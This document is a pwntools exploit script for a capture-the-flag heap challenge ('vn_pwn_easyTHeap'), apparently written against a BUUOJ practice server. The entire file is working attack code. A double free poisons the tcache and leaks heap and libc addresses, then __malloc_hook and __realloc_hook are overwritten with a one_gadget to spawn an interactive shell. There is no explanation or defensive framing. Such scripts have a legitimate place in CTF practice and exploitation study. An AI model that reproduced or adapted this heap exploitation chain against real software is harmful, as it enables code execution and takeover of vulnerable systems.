# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './vn_pwn_easyTHeap'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'node3.buuoj.cn'
port = '28472'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)


def add(s):
    sla(":", "1")
    sla("?", str(s))


def edit(s, c):
    sla(":", "2")
    sla("?", str(s))
    sea(":", c)


def show(s):
    sla(":", "3")
    sla("?", str(s))


def dele(s):
    sla(":", "4")
    sla("?", str(s))


add(0x80)
add(0x80)
dele(0)
dele(0)

show(0)
heap = un64(rn(6)) - 0x260
print hex(heap)
add(0x80)
edit(2, p64(heap + 0x10))
add(0x80)
add(0x80)
edit(
    4,
    str(p64(0x0700000000000000)).ljust(0x70, '\x00') +
    p64(libc.symbols['__malloc_hook']))
dele(0)
show(0)
libc.address = un64(rn(6)) - 0x3ebca0
print hex(libc.address)
edit(
    4,
    str(p64(0x0700000000000000)).ljust(0x78, '\x00') +
    p64(libc.symbols['__realloc_hook']))
add(0x80)
one = libc.address + 0x10a38c
edit(5, p64(one) + p64(libc.address + 0x98C36) + p64(one) * 2)
dbg("b*" + hex(one))
add(1)
shell()